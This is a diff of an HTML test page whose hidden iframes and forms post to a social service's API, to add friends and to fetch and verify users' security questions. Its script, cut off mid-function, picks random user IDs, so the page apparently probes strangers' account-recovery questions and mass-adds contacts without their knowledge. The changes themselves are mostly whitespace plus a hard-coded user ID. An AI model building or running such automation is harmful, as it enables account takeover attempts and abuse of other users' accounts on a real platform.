@@ -3,18 +3,18 @@
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <title>测试</title>
-	<style>
-	    .ks-overlay {
-	        position:absolute;
-	        left:-9999px;
-	        top:-9999px;
-	    }
-	</style>
+    <style>
+        .ks-overlay {
+            position:absolute;
+            left:-9999px;
+            top:-9999px;
+        }
+    </style>
 </head>
 <body>
- 	<iframe id="hidden_iframe_add" name="hidden_iframe_add"></iframe>
+    <iframe id="hidden_iframe_add" name="hidden_iframe_add"></iframe>
     <form action="http://api.laiwang.com/v1/relationship/friend/add_with_remark" method="post" target="hidden_iframe_add" id="add_ls_user">
-        <input name="id" value="" id="lw_userId" />
+        <input name="id" value="10883335" id="lw_userId" />
         <input name="remark" value="" />
         <input name="access_token" value="" />
         <input type="submit" />
@@ -22,21 +22,21 @@
 
     <iframe id="hidden_iframe_k" name="hidden_iframe_k"></iframe>
     <form action="http://api.laiwang.com/v1/stepping_stone/user_setting/question/get" method="get" target="hidden_iframe_k" id="knock_step1">
-        <input name="uid" value="" id="k1_uid" />
+        <input name="uid" value="10883335" id="k1_uid" />
         <input name="access_token" value="" />
         <input type="submit" />
     </form>
 
     <form action="http://api.laiwang.com/v1/stepping_stone/user_setting/question/verify" method="post" target="hidden_iframe_k" id="knock_step2">
         <input name="answers" id="k2_ans" />
-        <input name="uid" value="" id="k2_uid" />
+        <input name="uid" value="10883335" id="k2_uid" />
         <input name="access_token" value="" />
         <input type="submit" />
     </form>
 </body>
 
 <script type="text/javascript">
-var userData=[ ];
+var userData=[];
 var start=function(){
     if(new Date().getHours()>=5){
         var userId=Math.random()<.3?11100000+Math.round(Math.random()*(11200000-11100000)):2900000+Math.round(Math.random()*(6000000-2900000));
